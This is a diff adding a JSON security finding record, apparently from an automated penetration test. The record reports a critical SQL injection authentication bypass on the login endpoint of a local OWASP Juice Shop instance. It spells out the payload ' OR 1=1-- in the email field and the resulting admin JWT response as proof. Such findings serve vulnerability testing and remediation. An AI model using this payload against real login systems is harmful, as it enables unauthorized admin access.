@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855310373_a15b57",
+  "action": "confirm",
+  "title": "SQL Injection in Login - Authentication Bypass",
+  "severity": "critical",
+  "finding_kind": "vuln",
+  "location": "POST http://127.0.0.1:3010/rest/user/login",
+  "url": "POST http://127.0.0.1:3010/rest/user/login",
+  "description": "The login endpoint at /rest/user/login is vulnerable to SQL injection in the email parameter. Using payload ' OR 1=1-- bypasses authentication and returns a valid JWT token for the admin user (admin@juice-sh.op). This allows full admin access to the application.",
+  "poc": "Probe request against POST http://127.0.0.1:3010/rest/user/login; observed proving result from prior stage handoff: POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784855310360_becb2a"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855310360_becb2a",
+      "excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:08:30.373Z"
+}
